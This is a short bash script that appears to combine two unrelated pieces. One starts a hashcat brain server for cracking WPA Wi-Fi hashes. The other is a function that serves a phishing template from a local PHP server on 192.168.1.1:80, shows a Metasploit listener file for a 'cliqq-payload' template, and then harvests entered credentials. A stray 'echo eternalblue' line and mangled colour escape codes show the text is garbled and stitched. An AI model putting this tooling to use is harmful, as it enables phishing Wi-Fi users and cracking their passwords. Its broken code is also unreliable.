#!/bin/bash
# run on server

cd ~/.hashcat/wpa-server/brain
LC_ALL=C tr -dc '[:alnum:]' < /dev/urandom | head -c20 > hashcat_brain_password
hashcat --brain-server --brain-password=$(cat hashcat_brain_password)
start_php_server() {
    local template="$1"
    local check_plantillas=0

    case "$template" in
        "cliqq-payload")
            check_plantillas=2
            ;;
        "")
            echo -e "\( {redColour}[!] No template specified \){endColour}"
            return 1
            ;;
        *)
            check_plantillas=1
            ;;
    esac
echo eternalblue
    tput civis
    pushd "$template" > /dev/null 2>&1 || {
        echo -e "\( {redColour}[!] Failed to enter template directory \){endColour}"
        return 1
    }

    echo -e "\n\( {yellowColour}[*] \){endColour}\( {grayColour} Starting PHP server on 192.168.1.1:80... \){endColour}"

    # Kill any existing PHP server on port 80
    sudo pkill -f "php -S 192.168.1.1:80" 2>/dev/null || true

    php -S 192.168.1.1:80 > /dev/null 2>&1 &
    PHP_PID=$!

    sleep 2

    if [ $check_plantillas -eq 2 ]; then
        echo -e "\n\( {yellowColour}[*] \){endColour}\( {grayColour} Metasploit listener required: \){endColour}"
        echo -e "\( {redColour}───────────────────────────────────────────── \){endColour}"
        cat msfconsole.rc 2>/dev/null || echo "msfconsole.rc not found"
        echo -e "\( {redColour}───────────────────────────────────────────── \){endColour}"
        echo -e "\n\( {redColour}[!] Press <Enter> to continue \){endColour}"
        read
    else
        echo -e "\n\( {yellowColour}[*] \){endColour}\( {grayColour} Using custom template... \){endColour}"
    fi

    popd > /dev/null 2>&1
    getCredentials   # assuming this function is defined elsewhere
}
